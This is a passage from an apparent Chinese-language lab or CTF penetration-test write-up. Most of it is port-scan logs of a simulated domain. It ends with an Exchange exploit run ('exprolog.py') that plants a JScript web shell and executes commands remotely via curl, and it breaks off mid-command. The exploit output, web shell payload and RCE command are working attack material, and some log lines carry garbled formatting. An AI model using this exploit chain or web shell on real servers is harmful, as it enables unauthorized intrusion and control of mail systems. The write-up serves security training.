生成IP范围: 172.22.3.0.%!d(string=172.22.3.255) - %!s(MISSING).%!d(MISSING) 15[2025-04-09 00:51:47] [INFO] 解析CIDR 172.22.3.0/24 -\u0026gt; IP范围 172.22.3.0-172.22.3.255 16[2025-04-09 00:51:48] [INFO] 已排除指定主机: 1 个 17[2025-04-09 00:51:48] [INFO] 最终有效主机数量: 255 18[2025-04-09 00:51:48] [INFO] 开始主机扫描 19[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.2 存活 (ICMP) 20[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.26 存活 (ICMP) 21[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.9 存活 (ICMP) 22[2025-04-09 00:51:51] [INFO] 存活主机数量: 3 23[2025-04-09 00:51:51] [INFO] 有效端口数量: 65535 24[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:25 25[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:53 26[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:80 27[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:88 28[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:81 29[2025-04-09 00:51:51] [SUCCESS] 服务识别 172.22.3.9:25 =\u0026gt; [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 30[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:135 31[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.9:135 32[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.26:139 33[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.9:139 34[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.2:139 35[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.26:135 36[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.2:389 37[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:445 38[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.26:445 39[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:444 40[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.2:445 41[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:443 42[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:465 43[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:464 44[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:477 45[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:476 46[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:475 47[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:465 =\u0026gt; [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 48[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.2:88 =\u0026gt; 49[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:477 =\u0026gt; [smtp] 50[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:476 =\u0026gt; [smtp] 51[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:475 =\u0026gt; [smtp] 52[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:587 53[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:593 54[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:593 55[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:81 =\u0026gt; [http] 56[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:636 57[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:587 =\u0026gt; [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 58[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:717 59[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.2:593 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 60[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:593 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 61[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.2:636 =\u0026gt; 62[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:808 63[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:890 64[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:717 =\u0026gt; [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 65[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.26:139 =\u0026gt; Banner:[.] 66[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:139 =\u0026gt; Banner:[.] 67[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.2:139 =\u0026gt; Banner:[.] 68[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:1801 69[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:80 =\u0026gt; [http] 版本:10.0 产品:Microsoft IIS httpd 系统:Windows 70[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:2103 71[2025-04-09 00:51:58] [SUCCESS] 端口开放 172.22.3.9:2107 72[2025-04-09 00:51:58] [SUCCESS] 端口开放 172.22.3.9:2105 73[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.2:389 =\u0026gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 74[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.9:445 =\u0026gt; 75[2025-04-09 00:52:00] [SUCCESS] 端口开放 172.22.3.9:2525 76[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.26:445 =\u0026gt; 77[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.9:2525 =\u0026gt; [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 78[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.2:445 =\u0026gt; 79[2025-04-09 00:52:00] [SUCCESS] 端口开放 172.22.3.2:3268 80[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.2:3269 81[2025-04-09 00:52:01] [SUCCESS] 服务识别 172.22.3.2:3269 =\u0026gt; 82[2025-04-09 00:52:01] [SUCCESS] 服务识别 172.22.3.2:464 =\u0026gt; 83[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.2:3389 84[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.26:3389 85[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.9:3389 86[2025-04-09 00:52:02] [SUCCESS] 服务识别 172.22.3.9:808 =\u0026gt; 87[2025-04-09 00:52:02] [SUCCESS] 服务识别 172.22.3.9:890 =\u0026gt; 88[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3800 89[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3801 90[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3803 91[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3823 92[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3828 93[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3843 94[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3863 95[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3867 96[2025-04-09 00:52:03] [SUCCESS] 端口开放 172.22.3.9:3875 97[2025-04-09 00:52:05] [SUCCESS] 服务识别 172.22.3.2:3268 =\u0026gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 98[2025-04-09 00:52:06] [SUCCESS] 服务识别 172.22.3.26:3389 =\u0026gt; 99[2025-04-09 00:52:06] [SUCCESS] 端口开放 172.22.3.9:5060 100[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:5062 101[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:5065 102[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3801 =\u0026gt; 103[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3803 =\u0026gt; 104[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:1801 =\u0026gt; 105[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3823 =\u0026gt; 106[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3828 =\u0026gt; 107[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3843 =\u0026gt; 108[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3863 =\u0026gt; 109[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3867 =\u0026gt; 110[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6001 111[2025-04-09 00:52:08] [SUCCESS] 服务识别 172.22.3.9:6001 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 112[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6027 113[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6049 114[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6057 115[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6081 116[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6095 117[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6102 118[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6119 119[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6129 120[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6153 121[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6193 122[2025-04-09 00:52:09] [SUCCESS] 端口开放 172.22.3.9:6228 123[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6401 124[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6405 125[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6400 126[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6404 127[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6430 128[2025-04-09 00:52:11] [SUCCESS] 服务识别 172.22.3.9:5060 =\u0026gt; 129[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6448 130[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6449 131[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6454 132[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6490 133[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6492 134[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6497 135[2025-04-09 00:52:12] [SUCCESS] 服务识别 172.22.3.9:3800 =\u0026gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows 136[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6512 137[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6514 138[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6548 139[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6550 140[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6560 141[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6571 142[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6564 143[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6570 144[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6572 145[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6578 146[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6590 147[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6594 148[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6606 149[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6616 150[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6621 151[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6624 152[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6642 153[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6664 154[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6685 155[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6690 156[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6719 157[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6728 158[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6741 159[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6770 160[2025-04-09 00:52:17] [SUCCESS] 服务识别 172.22.3.9:5062 =\u0026gt; 161[2025-04-09 00:52:17] [SUCCESS] 服务识别 172.22.3.9:5065 =\u0026gt; 162[2025-04-09 00:52:17] [SUCCESS] 端口开放 172.22.3.9:6772 163[2025-04-09 00:52:18] [SUCCESS] 端口开放 172.22.3.9:7673 164[2025-04-09 00:52:19] [SUCCESS] 服务识别 172.22.3.9:6664 =\u0026gt; 165[2025-04-09 00:52:20] [SUCCESS] 端口开放 172.22.3.9:8172 166[2025-04-09 00:52:51] [SUCCESS] 服务识别 172.22.3.2:53 =\u0026gt; 167[2025-04-09 00:52:52] [SUCCESS] 端口开放 172.22.3.2:9389 168[2025-04-09 00:52:53] [SUCCESS] 服务识别 172.22.3.9:2103 =\u0026gt; 169[2025-04-09 00:52:53] [SUCCESS] 端口开放 172.22.3.9:9710 170[2025-04-09 00:52:53] [SUCCESS] 服务识别 172.22.3.9:2107 =\u0026gt; 171[2025-04-09 00:52:55] [SUCCESS] 端口开放 172.22.3.9:12393 172[2025-04-09 00:52:55] [SUCCESS] 服务识别 172.22.3.9:444 =\u0026gt; 173[2025-04-09 00:52:56] [SUCCESS] 服务识别 172.22.3.2:135 =\u0026gt; 174[2025-04-09 00:52:57] [SUCCESS] 端口开放 172.22.3.26:15774 175[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.2:9389 =\u0026gt; 176[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.9:135 =\u0026gt; 177[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.26:135 =\u0026gt; 178[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:9710 =\u0026gt; 179[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:3875 =\u0026gt; 180[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:2105 =\u0026gt; 181[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6027 =\u0026gt; 182[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6049 =\u0026gt; 183[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6057 =\u0026gt; 184[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6081 =\u0026gt; 185[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6095 =\u0026gt; 186[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6102 =\u0026gt; 187[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6119 =\u0026gt; 188[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6129 =\u0026gt; 189[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6153 =\u0026gt; 190[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6193 =\u0026gt; 191[2025-04-09 00:53:04] [SUCCESS] 服务识别 172.22.3.9:6228 =\u0026gt; 192[2025-04-09 00:53:05] [SUCCESS] 服务识别 172.22.3.9:12393 =\u0026gt; 193[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6401 =\u0026gt; 194[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6405 =\u0026gt; 195[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6400 =\u0026gt; 196[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.2:3389 =\u0026gt; 197[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6404 =\u0026gt; 198[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6430 =\u0026gt; 199[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:3389 =\u0026gt; 200[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6448 =\u0026gt; 201[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.26:15774 =\u0026gt; 202[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6449 =\u0026gt; 203[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6454 =\u0026gt; 204[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6490 =\u0026gt; 205[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6492 =\u0026gt; 206[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6497 =\u0026gt; 207[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6512 =\u0026gt; 208[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6514 =\u0026gt; 209[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6548 =\u0026gt; 210[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6550 =\u0026gt; 211[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6571 =\u0026gt; 212[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6564 =\u0026gt; 213[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6570 =\u0026gt; 214[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6572 =\u0026gt; 215[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6578 =\u0026gt; 216[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6590 =\u0026gt; 217[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6594 =\u0026gt; 218[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6606 =\u0026gt; 219[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6616 =\u0026gt; 220[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6621 =\u0026gt; 221[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6624 =\u0026gt; 222[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6642 =\u0026gt; 223[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6685 =\u0026gt; 224[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6690 =\u0026gt; 225[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6719 =\u0026gt; 226[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6728 =\u0026gt; 227[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6741 =\u0026gt; 228[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6770 =\u0026gt; 229[2025-04-09 00:53:12] [SUCCESS] 服务识别 172.22.3.9:6772 =\u0026gt; 230[2025-04-09 00:53:13] [SUCCESS] 服务识别 172.22.3.9:7673 =\u0026gt; 231[2025-04-09 00:53:13] [SUCCESS] 服务识别 172.22.3.9:6560 =\u0026gt; 232[2025-04-09 00:53:15] [SUCCESS] 服务识别 172.22.3.9:8172 =\u0026gt; 233[2025-04-09 00:53:20] [SUCCESS] 服务识别 172.22.3.9:443 =\u0026gt; 234[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.2:47001 235[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.26:47001 236[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.9:47001 237[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.2:47001 =\u0026gt; [http] 238[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.9:47001 =\u0026gt; [http] 239[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.26:47001 =\u0026gt; [http] 240[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49665 241[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49664 242[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49667 243[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49664 244[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49666 245[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49667 246[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49666 247[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49665 248[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49668 249[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49669 250[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49670 251[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49671 252[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49673 253[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49674 254[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49675 255[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49677 256[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49678 257[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49684 258[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49695 259[2025-04-09 00:53:39] [SUCCESS] 服务识别 172.22.3.2:49674 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 260[2025-04-09 00:53:55] [SUCCESS] 端口开放 172.22.3.2:52352 261[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49665 =\u0026gt; 262[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49664 =\u0026gt; 263[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49667 =\u0026gt; 264[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49664 =\u0026gt; 265[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49666 =\u0026gt; 266[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49667 =\u0026gt; 267[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49666 =\u0026gt; 268[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49665 =\u0026gt; 269[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49668 =\u0026gt; 270[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49669 =\u0026gt; 271[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49670 =\u0026gt; 272[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49671 =\u0026gt; 273[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49673 =\u0026gt; 274[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49675 =\u0026gt; 275[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49677 =\u0026gt; 276[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49678 =\u0026gt; 277[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49684 =\u0026gt; 278[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49695 =\u0026gt; 279[2025-04-09 00:54:46] [SUCCESS] 端口开放 172.22.3.9:64327 280[2025-04-09 00:54:46] [SUCCESS] 端口开放 172.22.3.9:64337 281[2025-04-09 00:54:50] [SUCCESS] 服务识别 172.22.3.2:52352 =\u0026gt; 282[2025-04-09 00:54:51] [SUCCESS] 服务识别 172.22.3.9:64337 =\u0026gt; 283[2025-04-09 00:55:41] [SUCCESS] 服务识别 172.22.3.9:64327 =\u0026gt; 284[2025-04-09 00:55:41] [INFO] 存活端口数量: 130 285[2025-04-09 00:55:41] [INFO] 开始漏洞扫描 286[2025-04-09 00:55:41] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, rdp, smb, smb2, smbghost, smtp, webpoc, webtitle 287[2025-04-09 00:55:41] [SUCCESS] 网站标题 http://172.22.3.9 状态码:403 长度:0 标题:无标题 288[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果 289目标主机: 172.22.3.9 290主机名: XIAORANG-EXC01 291发现的网络接口: 292 IPv4地址: 293 └─ 172.22.3.9 294[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果 295目标主机: 172.22.3.2 296主机名: XIAORANG-WIN16 297发现的网络接口: 298 IPv4地址: 299 └─ 172.22.3.2 300[2025-04-09 00:55:41] [INFO] 系统信息 172.22.3.2 [Windows Server 2016 Datacenter 14393] 301[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.26 XIAORANG\\XIAORANG-PC 302[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.2 DC:XIAORANG-WIN16.xiaorang.lab Windows Server 2016 Datacenter 14393 303[2025-04-09 00:55:41] [SUCCESS] 网站标题 http://172.22.3.9:81 状态码:403 长度:1157 标题:403 - 禁止访问: 访问被拒绝。 304[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果 305目标主机: 172.22.3.26 306主机名: XIAORANG-PC 307发现的网络接口: 308 IPv4地址: 309 └─ 172.22.3.26 310[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.9 XIAORANG-EXC01.xiaorang.lab Windows Server 2016 Datacenter 14393 311[2025-04-09 00:55:42] [SUCCESS] SMTP服务 172.22.3.9:25 允许匿名访问 312[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9 状态码:302 长度:0 标题:无标题 重定向地址: https://172.22.3.9/owa/ 313[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f\u0026amp;reason=0 状态码:200 长度:28237 标题:Outlook 314[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9:8172 状态码:404 长度:0 标题:无标题 扫到三台机子\n172.22.3.9 XIAORANG-EXC01\r172.22.3.2 DC:XIAORANG-WIN16.xiaorang.lab\r172.22.3.26 XIAORANG-PC 172.22.3.9上有一个exchange服务，有nday，直接上exprolog\n1python .\\exprolog.py -t 172.22.3.9 -e administrator@xiaorang.lab 2 3___________ __________ .__ 4\\_ _____/__ __\\______ \\_______ ____ | | ____ ____ 5 | __)_\\ \\/ /| ___/\\_ __ \\/ _ \\| | / _ \\ / ___\\ 6 | \\\u0026gt; \u0026lt; | | | | \\( \u0026lt;_\u0026gt; ) |_( \u0026lt;_\u0026gt; ) /_/ \u0026gt; 7/_______ /__/\\_ \\|____| |__| \\____/|____/\\____/\\___ / 8 \\/ \\/ /_____/ 9 10[#] Trying to get target FQDN 11[+] Got target FQDN: XIAORANG-EXC01 12[#] Trying to get target LegacyDN and ServerID 13[+] Got target LegacyDN: /o=XIAORANG LAB/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=8ca6ff254802459d9f63ee916eabb487-Administrat 14[+] Got target ServerID: b5ebdaa1-b4b3-4b71-ab32-7d03b4955a75 15[#] Trying to get target user SID 16[+] Got target administrator SID: S-1-5-21-533686307-2117412543-4200729784-500 17[#] Trying to get target administrator cookie sessions 18[+] Got target administrator session ID: fefab382-b49c-4a85-a748-8cee14485956 19[+] Got target administrator canary session ID: atsaGpfQ70qSuQAOEtYUV5LqJeTxeN0IkjUqGKytbR0zbRHwhB5ynGGNyD8fBXd6AyUH2qDHj9M. 20[#] Trying to get target OABVirtualDirectory ID 21[+] Got target AOB ID: 6d8fb74b-8477-43ee-83ba-0b119205e85f 22[#] Trying to inject OABVirtualDirectory Shell 23[+] Shell are injected 24[#] Verifying OABVirtualDirectory Shell 25[+] AOB Shell verified 26[+] AOB Shell payload: http:\\/\\/ooo\\/#%3Cscript%20language=%22JScript%22%20runat=%22server%22%3Efunction%20Page_Load()%7Beval(Request%5B%22request%22%5D,%22unsafe%22);%7D%3C\\/script%3E 27[#] Trying to export OABVirtualDirectory Shell 28[+] Shell are exported 29[*] CURL Request: 30curl --request POST --url https://172.22.3.9/owa/auth/pjo2b.aspx --header \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; --data \u0026#39;request=Response.Write(new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).exec(\u0026#34;whoami /all\u0026#34;).stdout.readall())\u0026#39; -k 31[*] DONE 发现可以RCE\nproxychains4 curl --request POST --url https://172.22.3.9/owa/auth/pjo2b.aspx --header \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; --data \u0026#39;request=Response.Write(new 